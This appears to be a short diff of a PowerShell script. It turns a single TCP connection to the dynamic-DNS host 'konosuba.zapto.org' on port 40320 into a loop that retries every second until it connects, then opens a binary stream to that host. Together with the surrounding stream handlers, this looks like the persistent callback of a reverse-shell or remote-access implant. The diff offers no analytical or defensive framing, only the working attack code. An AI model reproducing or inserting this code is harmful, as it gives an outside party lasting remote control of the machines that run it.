@@ -201,7 +201,21 @@ $PowerShell.Streams.Debug.Add_DataAdded({
     }
 })
 
-$tcpConnection = New-Object System.Net.Sockets.TcpClient("konosuba.zapto.org", 40320);
+$connected = $false
+do
+{
+    try
+    {
+        $tcpConnection = New-Object System.Net.Sockets.TcpClient("konosuba.zapto.org", 40320);
+        $connected = $true
+    }
+    catch
+    {
+        $connected = $false
+        Start-Sleep -Seconds 1
+    }
+
+} while(-not $connected)
 $tcpStream = $tcpConnection.GetStream()
 $binaryWriter = New-Object System.IO.BinaryWriter($tcpStream)
         
